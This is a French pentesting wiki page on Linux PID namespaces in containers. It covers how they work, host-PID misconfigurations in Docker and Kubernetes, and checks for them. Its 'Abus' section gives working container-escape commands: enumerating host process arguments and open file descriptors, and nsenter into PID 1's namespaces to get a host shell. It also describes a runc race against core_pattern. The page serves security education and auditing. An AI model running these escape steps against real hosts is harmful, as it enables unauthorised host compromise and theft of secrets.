# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

Le PID namespace contrôle la manière dont les processus sont numérotés et quels processus sont visibles. C'est pourquoi un container peut avoir son propre PID 1, même s'il ne s'agit pas d'une véritable machine. À l'intérieur du namespace, le workload voit ce qui ressemble à un arbre de processus local. À l'extérieur du namespace, l'host voit toujours les véritables PIDs de l'host et l'ensemble des processus présents.

Du point de vue de la sécurité, le PID namespace est important, car la visibilité des processus est précieuse. Dès qu'un workload peut voir les processus de l'host, il peut être en mesure d'observer les noms des services, les arguments de la ligne de commande, les secrets transmis dans les arguments des processus, l'état dérivé de l'environnement via `/proc`, ainsi que les cibles potentielles d'entrée dans un namespace. S'il peut faire plus que simplement voir ces processus, par exemple en envoyant des signaux ou en utilisant ptrace dans les bonnes conditions, le problème devient beaucoup plus sérieux.

## Fonctionnement

Un nouveau PID namespace commence avec sa propre numérotation interne des processus. Le premier processus créé à l'intérieur devient le PID 1 du point de vue du namespace, ce qui signifie également qu'il bénéficie d'une sémantique spéciale similaire à celle d'un processus init pour les processus enfants orphelins et la gestion des signaux. Cela explique de nombreuses particularités des containers liées aux processus init, à la récupération des processus zombies et à l'utilisation occasionnelle de petits wrappers init dans les containers.

La leçon importante en matière de sécurité est qu'un processus peut sembler isolé parce qu'il ne voit que son propre arbre de PIDs, mais cette isolation peut être délibérément supprimée. Docker expose cette fonctionnalité via `--pid=host`, tandis que Kubernetes le fait via `hostPID: true`. Une fois que le container rejoint le PID namespace de l'host, le workload voit directement les processus de l'host, et de nombreux chemins d'attaque ultérieurs deviennent beaucoup plus réalistes.

## Lab

Pour créer manuellement un PID namespace :
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Le shell voit désormais une vue privée des processus. Le flag `--mount-proc` est important, car il monte une instance de procfs correspondant au nouveau namespace PID, ce qui rend la liste des processus cohérente depuis l’intérieur.

Pour comparer le comportement du container :
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
La différence est immédiate et facile à comprendre, c'est pourquoi il s'agit d'un bon premier lab pour les lecteurs.

## Utilisation du runtime

Les containers normaux dans Docker, Podman, containerd et CRI-O obtiennent leur propre namespace PID. Les Pods Kubernetes reçoivent généralement eux aussi une vue PID isolée, sauf si le workload demande explicitement le partage du PID de l'host. Les environnements LXC/Incus reposent sur le même primitive du kernel, bien que les cas d'utilisation des system-containers puissent exposer des arbres de processus plus complexes et encourager davantage de raccourcis de debugging.

La même règle s'applique partout : si le runtime a choisi de ne pas isoler le namespace PID, il s'agit d'une réduction délibérée de la boundary du container.

## Mauvaises configurations

La mauvaise configuration canonique est le partage du PID de l'host. Les équipes le justifient souvent par des besoins de debugging, de monitoring ou de gestion des services, mais cela doit toujours être traité comme une exception de sécurité significative. Même si le container ne dispose d'aucun primitive d'écriture immédiate sur les processus de l'host, la visibilité seule peut révéler beaucoup d'informations sur le système. Dès que des capabilities comme `CAP_SYS_PTRACE` ou un accès utile à procfs sont ajoutés, le risque augmente considérablement.

Une autre erreur consiste à supposer que, puisque le workload ne peut pas tuer ou utiliser ptrace sur les processus de l'host par défaut, le partage du PID de l'host est donc inoffensif. Cette conclusion ignore la valeur de l'énumération, la disponibilité de cibles pour l'entrée dans les namespaces et la manière dont la visibilité des PID se combine avec d'autres contrôles affaiblis.

## Abus

Si le namespace PID de l'host est partagé, un attaquant peut inspecter les processus de l'host, récupérer les arguments des processus, identifier des services intéressants, localiser des PID candidats pour `nsenter` ou combiner la visibilité des processus avec des privilèges liés à ptrace afin d'interférer avec les workloads de l'host ou voisins. Dans certains cas, le simple fait de voir le bon processus longuement actif suffit à réorienter le reste du plan d'attaque.

La première étape pratique consiste toujours à confirmer que les processus de l'host sont réellement visibles :
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Une fois les PID de l’hôte visibles, les arguments des processus et les cibles d’entrée dans les namespaces deviennent souvent la source d’informations la plus utile :
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Si `nsenter` est disponible et que les privilèges sont suffisants, vérifiez si un processus hôte visible peut être utilisé comme pont entre namespaces :
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Même lorsque l'accès est bloqué, le partage des PID de l'hôte reste précieux, car il révèle l'architecture des services, les composants d'exécution et les processus privilégiés potentiels à cibler ensuite.

La visibilité des PID de l'hôte rend également l'abus des descripteurs de fichiers plus réaliste. Si un processus privilégié de l'hôte ou une charge de travail voisine a ouvert un fichier ou un socket sensible, l'attaquant peut être en mesure d'inspecter `/proc/<pid>/fd/` et de réutiliser ce handle, selon la propriété, les options de montage de procfs et le modèle du service ciblé.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Ces commandes sont utiles, car elles indiquent si `hidepid=1` ou `hidepid=2` réduit la visibilité inter-processus et si des descripteurs manifestement intéressants, tels que des fichiers secrets ouverts, des logs ou des sockets Unix, sont visibles.

### Exemple complet : host PID + `nsenter`

Le partage des PID de l'hôte devient une évasion directe de l'hôte lorsque le processus dispose également de privilèges suffisants pour rejoindre les namespaces de l'hôte :
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Si la commande réussit, le processus du conteneur s’exécute désormais dans les namespaces mount, UTS, network, IPC et PID de l’hôte. L’impact est une compromission immédiate de l’hôte.

Même lorsque `nsenter` est absent, le même résultat peut être obtenu via le binaire de l’hôte si le système de fichiers de l’hôte est monté :
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Notes récentes sur le runtime

Certaines attaques pertinentes pour les PID namespaces ne sont pas des erreurs de configuration traditionnelles `hostPID: true`, mais des bugs d’implémentation du runtime liés à la manière dont les protections de procfs sont appliquées lors de la configuration du container.

#### Race de `maskedPaths` vers le procfs de l’hôte

Dans les versions vulnérables de `runc`, les attackers capables de contrôler l’image du container ou la charge de travail de `runc exec` pouvaient exploiter une race pendant la phase de masquage en remplaçant le `/dev/null` côté container par un symlink vers un chemin procfs sensible tel que `/proc/sys/kernel/core_pattern`. Si la race réussissait, le bind mount du chemin masqué pouvait aboutir sur la mauvaise cible et exposer au nouveau container des paramètres procfs globaux à l’hôte.<sup>[[1]](#references)</sup>

Commande utile pour la review :
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Ceci est important, car l’impact final peut être le même qu’une exposition directe de procfs : `core_pattern` ou `sysrq-trigger` inscriptible, suivie de l’exécution de code sur l’hôte ou d’un déni de service.

#### Injection de namespace avec `insject`

Les outils d’injection de namespace tels que `insject` montrent que l’interaction avec un PID namespace ne nécessite pas toujours d’entrer au préalable dans le namespace cible avant la création du processus. Un helper peut s’attacher ultérieurement, utiliser `setns()`, puis s’exécuter tout en conservant la visibilité sur l’espace de PID cible :<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Ce type de technique concerne principalement le debugging avancé, les outils offensifs et les workflows de post-exploitation où le contexte du namespace doit être rejoint après l'initialisation du workload par le runtime.

### Patterns d'abus de FD

Deux patterns méritent d'être explicitement signalés lorsque les PIDs de l'hôte sont visibles. Premièrement, un processus privilégié peut conserver un file descriptor sensible ouvert lors d'un `execve()` parce qu'il n'a pas été marqué `O_CLOEXEC`. Deuxièmement, les services peuvent transmettre des file descriptors via des sockets Unix au moyen de `SCM_RIGHTS`. Dans les deux cas, l'objet intéressant n'est plus le pathname, mais le handle déjà ouvert qu'un processus avec moins de privilèges peut hériter ou recevoir.

Cela est important dans le contexte des containers, car le handle peut pointer vers `docker.sock`, un log privilégié, un fichier de secrets de l'hôte ou un autre objet à haute valeur, même si le chemin lui-même n'est pas directement accessible depuis le filesystem du container.

## Vérifications

Le but de ces commandes est de déterminer si le processus dispose d'une vue PID privée ou s'il peut déjà énumérer un paysage de processus beaucoup plus vaste.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Ce qui est intéressant ici :

- Si la liste des processus contient des services évidents de l’hôte, le partage des PID de l’hôte est probablement déjà actif.
- Ne voir qu’une petite arborescence locale au conteneur constitue la situation normale ; voir `systemd`, `dockerd` ou des daemons sans rapport ne l’est pas.
- Dès que les PID de l’hôte sont visibles, même les informations en lecture seule sur les processus deviennent utiles pour la reconnaissance.

Si vous découvrez qu’un conteneur s’exécute avec le partage des PID de l’hôte, ne considérez pas cela comme une simple différence cosmétique. Cela modifie considérablement ce que le workload peut observer et potentiellement affecter.

## Références

- [1] [runc security advisory: évasion de conteneur via l’abus de « masked path » dû à des conditions de concurrence lors du montage (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool Release – insject : un injecteur de Linux Namespace](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)

{{#include ../../../../../banners/hacktricks-training.md}}
